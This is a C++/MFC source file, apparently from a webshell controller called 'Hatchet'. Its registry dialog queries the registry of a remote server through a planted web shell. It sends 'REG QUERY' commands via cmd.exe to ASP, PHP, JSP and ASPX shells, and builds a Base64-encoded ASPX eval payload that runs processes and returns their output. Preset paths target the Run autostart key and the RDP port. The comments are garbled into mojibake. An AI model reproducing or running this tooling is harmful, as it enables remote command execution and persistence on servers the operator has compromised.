// RegistryDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Hatchet.h"
#include "RegistryDlg.h"
#include "MainHatchet.h"

DWORD WINAPI RegistryGetData(LPVOID lpParam);
// CRegistryDlg �Ի���

IMPLEMENT_DYNAMIC(CRegistryDlg, CDialog)

CRegistryDlg::CRegistryDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CRegistryDlg::IDD, pParent)
{

}

CRegistryDlg::~CRegistryDlg()
{
	DestroyWindow();
}

void CRegistryDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_REGISTRY_TREE, m_registry_tree);
	DDX_Control(pDX, IDC_REGISTRY_LIST, m_registry_list);
	DDX_Control(pDX, IDC_REGISTRY_COMBO, m_registry_com);
}


BEGIN_MESSAGE_MAP(CRegistryDlg, CDialog)
	ON_WM_SIZE()
	ON_BN_CLICKED(IDC_REGISTRY_BUTTON, &CRegistryDlg::OnBnClickedRegistryButton)
	ON_NOTIFY(TVN_SELCHANGING, IDC_REGISTRY_TREE, &CRegistryDlg::OnTvnSelchangingRegistryTree)
	ON_BN_CLICKED(IDC_REGISTRY_RADIO_CMD, &CRegistryDlg::OnBnClickedRegistryRadioCmd)
	ON_BN_CLICKED(IDC_REGISTRY_RADIO_WSCRIPT, &CRegistryDlg::OnBnClickedRegistryRadioWscript)
	ON_NOTIFY(NM_RCLICK, IDC_REGISTRY_LIST, &CRegistryDlg::OnNMRclickRegistryList)

	ON_COMMAND(ID_REGISTRY_REFRESH, OnRegistryRefresh)				//ˢ��
	ON_COMMAND(ID_REGISTRY_CLEARTHECACHESITE, OnRegistryClearCache)		//��ջ���
END_MESSAGE_MAP()


// CRegistryDlg ��Ϣ�������
BOOL CRegistryDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	bThreadFinish = true;

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	GetDlgItem(IDC_REGISTRY_COMBO)->SetFont(&m_FontSample);
	GetDlgItem(IDC_REGISTRY_BUTTON)->SetFont(&m_FontSample);
	GetDlgItem(IDC_REGISTRY_TREE)->SetFont(&m_FontSample);
	GetDlgItem(IDC_REGISTRY_LIST)->SetFont(&m_FontSample);
	GetDlgItem(IDC_REGISTRY_CMD)->SetFont(&m_FontSample);

	SetDlgItemText(IDC_REGISTRY_CMD, "cmd.exe");

	m_edit.SetWindowText( "Registry Management" );					//����״̬��

	szSiteUrl = szGlobal_SiteUrl;
	szSitePass = szGlobal_SitePass;
	nSiteScript = nGlobal_SiteScript;
	nSiteCode = nGlobal_SiteCode;

	LRESULT lstyle = m_registry_list.SendMessage(LVM_GETEXTENDEDLISTVIEWSTYLE);
	lstyle |= LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES  ; //LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT| LVS_EX_GRIDLINES 
	m_registry_list.SendMessage(LVM_SETEXTENDEDLISTVIEWSTYLE,0,(LPARAM)lstyle);


	m_registry_list.InsertColumn(0,"Name",LVCFMT_LEFT,200);
	m_registry_list.InsertColumn(1,"Type",LVCFMT_LEFT,150);
	m_registry_list.InsertColumn(2,"Data",LVCFMT_LEFT,300);

	m_registry_tree.InsertItem("HKEY_CURRENT_USER", TVI_ROOT,TVI_LAST);
	m_registry_tree.InsertItem("HKEY_LOCAL_MACHINE", TVI_ROOT,TVI_LAST);
	m_registry_tree.InsertItem("HKEY_USERS", TVI_ROOT,TVI_LAST);
	m_registry_tree.InsertItem("HKEY_CURRENT_CONFIG", TVI_ROOT,TVI_LAST);
	m_registry_tree.InsertItem("HKEY_CLASSES_ROOT", TVI_ROOT,TVI_LAST);

	m_registry_com.AddString("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	m_registry_com.AddString("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp");
	m_registry_com.AddString("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\\PortNumber");

	CButton* pRadio=(CButton*)GetDlgItem(IDC_REGISTRY_RADIO_CMD);
	pRadio->SetCheck(1);


	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CRegistryDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	CRect rcClient;
	GetClientRect(rcClient);

	CRect	rcCWnd = rcClient;
	CWnd*	pCWnd   =   GetDlgItem(IDC_REGISTRY_CMD);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = 2;
		rcCWnd.bottom = 23;
		rcCWnd.right = 100;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_REGISTRY_BUTTON);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = rcCWnd.right-75;
		rcCWnd.bottom = 23;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_REGISTRY_COMBO);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = 102;
		rcCWnd.bottom = 23;
		rcCWnd.right = rcCWnd.right-77-102-102;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_REGISTRY_RADIO_CMD);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = rcCWnd.right-77-100-102;
		rcCWnd.bottom = 23;
		rcCWnd.right = rcCWnd.right-77-102;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_REGISTRY_RADIO_WSCRIPT);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 2;
		rcCWnd.left = rcCWnd.right-77-100;
		rcCWnd.bottom = 23;
		rcCWnd.right = rcCWnd.right-77;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_REGISTRY_TREE);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 25;
		rcCWnd.left = 2;
		rcCWnd.bottom = rcCWnd.bottom - 2;
		rcCWnd.right = 248;
		pCWnd->MoveWindow(rcCWnd);
	}

	rcCWnd = rcClient;
	pCWnd   =   GetDlgItem(IDC_REGISTRY_LIST);
	if (pCWnd != NULL)
	{
		rcCWnd.top = 25;
		rcCWnd.left = 250;
		rcCWnd.bottom = rcCWnd.bottom - 2;
		rcCWnd.right = rcCWnd.right - 2;
		pCWnd->MoveWindow(rcCWnd);
	}
	//////////////////////////////////////////////////////////////////////////	�Զ��ı�LIST���
	if (pCWnd)
	{
		pCWnd->GetClientRect(rcClient);
		int nWidth = rcClient.Width()-200-150-20;
		m_registry_list.SetColumnWidth(2, nWidth);
	}
	//////////////////////////////////////////////////////////////////////////
}

BOOL CRegistryDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if(pMsg -> message == WM_KEYDOWN)
	{
		if ((pMsg->wParam == 'A' || pMsg->wParam == 'a') && ::GetKeyState(VK_CONTROL)&0x8000)
		{
			if ( GetDlgItem(IDC_REGISTRY_CMD) == GetFocus() )						//ȫѡ
			{
				((CEdit *)GetDlgItem(IDC_REGISTRY_CMD))->SetSel( 0, -1);			//ȫѡ
			}
		}
		if (pMsg -> wParam == VK_F5)
		{
			OnRegistryRefresh();				//ˢ��
		}

		if(pMsg -> wParam == VK_ESCAPE)
		{
			return TRUE;
		}
		if(pMsg -> wParam == VK_RETURN)
		{
			if ((GetFocus()->GetParent()) == GetDlgItem(IDC_REGISTRY_COMBO))
			{
				OnBnClickedRegistryButton();		//�س���ȡ
			}
			return TRUE;
		}
	}

	return CDialog::PreTranslateMessage(pMsg);
}
//////////////////////////////////////////////////////////////////////////
void CRegistryDlg::OnBnClickedRegistryRadioCmd()
{
	GetDlgItem(IDC_REGISTRY_CMD)->EnableWindow(TRUE);
	GetDlgItem(IDC_REGISTRY_TREE)->EnableWindow(TRUE);
}

void CRegistryDlg::OnBnClickedRegistryRadioWscript()
{
	GetDlgItem(IDC_REGISTRY_CMD)->EnableWindow(FALSE);
	GetDlgItem(IDC_REGISTRY_TREE)->EnableWindow(FALSE);
}



void CRegistryDlg::OnBnClickedRegistryButton()											//��ť ��ȡ
{
	CString szRegistry_Path;
	GetDlgItemText(IDC_REGISTRY_COMBO, szRegistry_Path);
	OnRegistryGet(szRegistry_Path);
}

void CRegistryDlg::OnTvnSelchangingRegistryTree(NMHDR *pNMHDR, LRESULT *pResult)		//ѡ����һ������һ��
{
	LPNMTREEVIEW pNMTreeView = reinterpret_cast<LPNMTREEVIEW>(pNMHDR);

	HTREEITEM m_hItem = pNMTreeView->itemNew.hItem;

	if (!bThreadFinish)
	{
		m_edit.SetWindowText( "RegistryGetData Threads busy" );					//����״̬��
		*pResult = TRUE;		//���� TRUE ��ֹѡ����һ����� FALSE ������ѡ����һ�
		return;
	}

	if (m_registry_tree.GetItemText(m_hItem) != "")
	{
		CString szRegistry_Path = "";
		CString strTemp;
		while ( m_hItem )
		{
			strTemp  = m_registry_tree.GetItemText( m_hItem );

			szRegistry_Path = strTemp + "\\" + szRegistry_Path;

			m_hItem = m_registry_tree.GetParentItem( m_hItem );
		}
		OnRegistryGet(szRegistry_Path);
	}
	*pResult = 0;
}

void CRegistryDlg::OnRegistryGet(CString szPath, bool bNoSelectTempDB)
{
	if (szPath == "")
	{
		return;
	}

	if (m_registry_com.FindStringExact(-1, szPath) == CB_ERR)		//û�м�¼������
	{
		m_registry_com.InsertString(0, szPath);
	}

	szPath.Replace("/", "\\");
	while(szPath.Replace("\\\\","\\") != 0)
	{
	}
	if (szPath.Right(1) == "\\")									//���һ��б��ȥ��
	{
		szPath = szPath.Mid(0, szPath.GetLength()-1);
	}
	SetDlgItemText(IDC_REGISTRY_COMBO, szPath);
	///////////////////////////////////////

	if (bThreadFinish)
	{
		bThreadFinish = false;
		RegistryGetData_szPath = szPath;
		RegistryGetData_bNoDB = bNoSelectTempDB;		//�٣������ݿ�
		m_registry_list.DeleteAllItems();
		CreateThread(NULL, 0, RegistryGetData, (LPVOID)this, 0, 0);
	}else{
		m_edit.SetWindowText( "RegistryGetData Threads busy" );					//����״̬��
	}
	return;
}


DWORD WINAPI RegistryGetData(LPVOID lpParam)
{
	CRegistryDlg* pDlg = (CRegistryDlg*)lpParam;

	CButton* pRadio=(CButton*)pDlg->GetDlgItem(IDC_REGISTRY_RADIO_CMD);
	BOOL bRadio_Cmd = pRadio->GetCheck();

	CString temp = "";
	if (!bRadio_Cmd)			//WS�����ȡ
	{
		if (pDlg->nSiteScript == 1)					//ASP
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szRegistryRead[0] + UrlEnCode(pDlg->nSiteCode, pDlg->RegistryGetData_szPath), pDlg->nSiteCode, temp, szError);
		}else if (pDlg->nSiteScript == 2)				//ASPX
		{
			//bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szRegistryRead[1] + UrlEnCode(pDlg->nSiteCode, pDlg->RegistryGetData_szPath), pDlg->nSiteCode, temp, szError);
			m_edit.SetWindowText( "Software is improving!" );					//����״̬��
			pDlg->bThreadFinish = true;
			return 0;
		}else if (pDlg->nSiteScript == 3)				//PHP
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szRegistryRead[2] + UrlEnCode(pDlg->nSiteCode, pDlg->RegistryGetData_szPath), pDlg->nSiteCode, temp, szError);
		}else if (pDlg->nSiteScript == 4)				//JSP
		{
			m_edit.SetWindowText( "Software is improving!" );					//����״̬��
			pDlg->bThreadFinish = true;
			return 0;
		}

		if (pDlg->m_hWnd == NULL)		//����ִ�У�����رվͱ����ˡ�
		{
			return 0;
		}
		if (!bHttpIsOK)
		{
			pDlg->bThreadFinish = true;
			AfxMessageBox( szError );
			return 0;
		}

		pDlg->m_registry_list.InsertItem(0, pDlg->RegistryGetData_szPath.Right(rfind(pDlg->RegistryGetData_szPath, "\\") - 1) );
		pDlg->m_registry_list.SetItemText(0, 1, "");
		pDlg->m_registry_list.SetItemText(0, 2, temp);


		m_edit.SetWindowText( "Item(-1),Value(1)" );					//����״̬��
		pDlg->bThreadFinish = true;
		return 0;
	}

	//////////////////////////////////////////////////////////////////////////
	//////////////////////////////////////////////////////////////////////////
	//////////////////////////////////////////////////////////////////////////

	CString szCmdAddr;
	pDlg->GetDlgItemText(IDC_REGISTRY_CMD, szCmdAddr);


	CString szCacheItem = pDlg->szSiteUrl.Left( pDlg->szSiteUrl.Find("/", 9) ) +"!";	//��ʼ�� Item
	szCacheItem.Replace("'", "''");

	MydbTmpArray.RemoveAll();
	if (pDlg->RegistryGetData_bNoDB)
	{
		pMydbTmp->Execute("Delete from CACHE where Item='"+ szCacheItem + pDlg->RegistryGetData_szPath +"'");		//��ջ���
	}else{
		pMydbTmp->Select("Select Dat from CACHE where Item='"+ szCacheItem + pDlg->RegistryGetData_szPath +"'", MydbTmpArray);				//��ѯ����
	}

	if (MydbTmpArray.GetSize() == 0)			// û�л�������
	{
		if (pDlg->nSiteScript == 1)					//ASP
		{
			szCmdAddr = UrlEnCode(pDlg->nSiteCode, szCmdAddr, false, true);

			temp = UrlEnCode(pDlg->nSiteCode, "REG QUERY \""+ pDlg->RegistryGetData_szPath + "\"", false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szCmdGetExec[0] + "&z1="+ szCmdAddr +"&z2="+ temp, pDlg->nSiteCode, temp, szError);

		}else if (pDlg->nSiteScript == 2)				//ASPX
		{
			szCmdAddr = MyBase64Encode(pDlg->nSiteCode, szCmdAddr);

			temp = MyBase64Encode(pDlg->nSiteCode, "REG QUERY \"" + pDlg->RegistryGetData_szPath + "\"");
			CString szCmdFamatPageCode;
			szCmdFamatPageCode.Format("%d", pDlg->nSiteCode);
			temp = szCmdGetExec[1] + "&z1="+ szCmdAddr +"&z2="+ temp;
			temp.Replace("%nPageCode%", szCmdFamatPageCode);

			CString szBase64EvalCode = "var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("+ szCmdFamatPageCode +").GetString("
				"System.Convert.FromBase64String(Request.Item[\"z1\"])));var e=new System.Diagnostics.Process()"
				";var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectSt"
				"andardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\"/c \"+System.Te"
				"xt.Encoding.GetEncoding("+ szCmdFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z2\"])"
				");e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd());";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp, pDlg->nSiteCode, temp, szError);

		}else if (pDlg->nSiteScript == 3)				//PHP
		{
			szCmdAddr = MyBase64Encode(pDlg->nSiteCode, szCmdAddr);

			temp = MyBase64Encode(pDlg->nSiteCode, "REG QUERY \"" + pDlg->RegistryGetData_szPath + "\"");

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + szCmdGetExec[2] + "&z1="+ szCmdAddr +"&z2="+ temp, pDlg->nSiteCode, temp, szError);
		}else if (pDlg->nSiteScript == 4)				//JSP
		{
			szCmdAddr = UrlEnCode(pDlg->nSiteCode, szCmdAddr);

			CString szSiteCode = "UTF-8";
			if (pDlg->nSiteCode == 65001)
			{
				szSiteCode = "UTF-8";
			}
			else if (pDlg->nSiteCode == 936)
			{
				szSiteCode = "GB2312";
			}
			else if (pDlg->nSiteCode == 950)
			{
				szSiteCode = "BIG5";
			}

			temp = UrlEnCode(pDlg->nSiteCode, "REG QUERY \"" + pDlg->RegistryGetData_szPath + "\"");

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + "=M&z0="+ szSiteCode +"&z1=/c"+ szCmdAddr +"&z2="+ temp, pDlg->nSiteCode, temp, szError);
		}

		if (pDlg->m_hWnd == NULL)		//����ִ�У�����رվͱ����ˡ�
		{
			return 0;
		}
		if (!bHttpIsOK)
		{
			pDlg->bThreadFinish = true;
			AfxMessageBox( szError );
			return 0;
		}

		CString szCathDat = temp;
		szCathDat.Replace("'", "''");
		pMydbTmp->Execute("INSERT INTO CACHE (Item,Dat) VALUES ('"+ szCacheItem + pDlg->RegistryGetData_szPath +"','"+ szCathDat +"')");			//���滺��

	}else{
		temp = MydbTmpArray.GetAt(0);		// ����������
	}

	if (temp.Left(8) == "ERROR://")
	{
		m_edit.SetWindowText( temp );					//����״̬��
		pDlg->bThreadFinish = true;
		return 0;
	}

	//�������� XP
	//HKEY_CLASSES_ROOT
	//HKEY_CLASSES_ROOT\*

	//HKEY_CLASSES_ROOT\
	//HKEY_CLASSES_ROOT\\*

	//2003
	//HKEY_CLASSES_ROOT
	//HKEY_CLASSES_ROOT\*

	//HKEY_CLASSES_ROOT\
	//HKEY_CLASSES_ROOT\*


	//���ǰ���� szPath ����
	//���ǰ���� �ĸ��ո� ��ֵ
	HTREEITEM m_hNowItem = FindItems(pDlg->m_registry_tree, pDlg->RegistryGetData_szPath, true);

	CString			szRegistryItemLine;
	int posA = 0, posB = -1;
	int m_i = -1;				//�ж��ٸ�ֵ
	int t_i = 0;				//�ж��ٸ���
	while( posA != -1)
	{
		posA = temp.Find("\r\n", posB + 1);
		if (posA == -1)
		{
			break;
		}

		szRegistryItemLine = temp.Mid(posB, posA - posB);
		//szRegistryItemLine.TrimLeft();					//���ǰ���� �ĸ��ո� ��ֵ
		//szRegistryItemLine.TrimRight();
		szRegistryItemLine.Replace("\r", "");
		szRegistryItemLine.Replace("\n", "");

		posB = posA;		

		int posZ = szRegistryItemLine.Find(pDlg->RegistryGetData_szPath + "\\");
		if ( posZ == 0 )
		{
			int nRegistryGetData_szPathLen = pDlg->RegistryGetData_szPath.GetLength();
			CString szRegistryItemLine_tree = szRegistryItemLine.Mid(nRegistryGetData_szPathLen + 1 + posZ, szRegistryItemLine.GetLength() - nRegistryGetData_szPathLen - 1 - posZ);
			szRegistryItemLine_tree.TrimLeft();
			szRegistryItemLine_tree.TrimRight();
			t_i++;		//�ж��ٸ���
			if (bIsExistItem(pDlg->m_registry_tree, m_hNowItem, szRegistryItemLine_tree, true) == false)		//�Ƿ���ڣ����ھͲ�������
			{
				pDlg->m_registry_tree.InsertItem(szRegistryItemLine_tree, 1, 1, m_hNowItem);
				pDlg->m_registry_tree.Expand(m_hNowItem, TVE_EXPAND);
			}
			//AfxMessageBox( "111: " + szRegistryItemLine );
		}else if(szRegistryItemLine.Find("    ") == 0)
		{
			m_i = pDlg->m_registry_list.GetItemCount();
			int nFind = 1;
			int posX = szRegistryItemLine.Find("\t", 1);
			int posY = szRegistryItemLine.Find("\t", posX + 1);

			if (posX == -1)
			{
				nFind = 4;
				posX = szRegistryItemLine.Find("    ", 1);					//XP \t 2003 �ĸ��ո�
				posY = szRegistryItemLine.Find("    ", posX + 1);
			}

			if (posX != -1)
			{
				pDlg->m_registry_list.InsertItem(m_i, szRegistryItemLine.Mid(4, posX-4));
			}
			if (posX != -1 && posY != -1)
			{
				pDlg->m_registry_list.SetItemText(m_i, 1, szRegistryItemLine.Mid(posX + nFind, posY - posX - nFind));
				pDlg->m_registry_list.SetItemText(m_i, 2, szRegistryItemLine.Mid(posY + nFind, szRegistryItemLine.GetLength() - posY - nFind));
			}			
			//AfxMessageBox( "222: " + szRegistryItemLine );
		}
	}

	temp.Format("Item(%d),Value(%d)", t_i, m_i+1);
	m_edit.SetWindowText( temp );					//����״̬��
	pDlg->bThreadFinish = true;
	return 0;
}


void CRegistryDlg::OnNMRclickRegistryList(NMHDR *pNMHDR, LRESULT *pResult)					//�Ҽ�����
{
	CMenu popMenu;
	VERIFY(popMenu.LoadMenu(IDR_MENU1));
	CMenu *p=popMenu.GetSubMenu(6);
	ASSERT(p!=NULL);
	CPoint pt;
	GetCursorPos(&pt);
	p->TrackPopupMenu(TPM_RIGHTBUTTON, pt.x, pt.y,this);


	*pResult = 0;
}


void CRegistryDlg::OnRegistryRefresh()				//ˢ��
{
	m_edit.SetWindowText( "Refreshing" );					//����״̬��

	CString szRegistry_Path;
	GetDlgItemText(IDC_REGISTRY_COMBO, szRegistry_Path);
	OnRegistryGet(szRegistry_Path, true);

	return;
}
void CRegistryDlg::OnRegistryClearCache()		//��ջ���
{
	CString szCacheItem = szSiteUrl.Left( szSiteUrl.Find("/", 9) ) +"!";	//��ʼ�� Item
	szCacheItem.Replace("'", "''");

	if ( pMydbTmp->Execute("Delete from CACHE where Item like '"+ szCacheItem + "%'") )
	{
		m_edit.SetWindowText( "Clear Cache Success" );					//����״̬��
	}else{
		m_edit.SetWindowText( "Clear Cache Failed" );					//����״̬��
	}
	return;
}